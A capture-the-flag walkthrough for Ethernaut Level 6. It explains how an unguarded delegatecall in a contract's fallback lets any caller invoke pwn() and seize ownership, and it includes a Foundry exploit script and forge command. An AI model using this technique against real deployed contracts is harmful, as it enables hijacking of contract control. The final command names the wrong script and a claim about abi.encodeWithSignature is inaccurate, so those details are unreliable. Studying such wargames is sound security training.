# Ethernaut Level 6

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

Our goal is to claim ownership of the `Delegation` contract instance. Delegate call is a common approach for proxy-implementation structure, where the proxy A delegate calls the implementation B, logic in B is executed while state change happens in A. In the other word, logic in B is executed *in the context of* A.

So back to the contract. We can see that there's a delegate call in the fallback function of `Delegation`. If we call the `Delegation` contract with a `msg.data`, this call will be further delegated to the address of the `delegate`, where the logic will be executed based on the message. Note that the function `pwn()` can set the ownership to `msg.sender`, if we delegate call the `pwn()` function, then the `owner` in the function will be actually pointed to the state vairable in `Delegation` contract instance, and `msg.sender` will be the caller who has called the `Delegation` contract instance, which is exactly our EOA.

`Delegation.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationScript is Script {
    Delegation delegation = Delegation(0xXXXXXXXX);

    function run() external {
        vm.startBroadcast();
        console.log("Current owner:", delegation.owner());
        address(delegation).call{value: 0}(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
        console.log("New owner:", delegation.owner());
    }
}
```

In the script, we basically just call the delegation address, which will trigger the `fallback()` logic inside the delegation, which will then delegate call the delegate to switch ownership to our EOA. Note that the `abi.encodeWithSignature()` returns a `bytes4` function signature, which will be the data of the call.

We can then run the command:

```bash
forge script script/Token.s.sol:TokenScript --rpc-url $SEPOLIA_RPC_URL$ --account default --broadcast
```

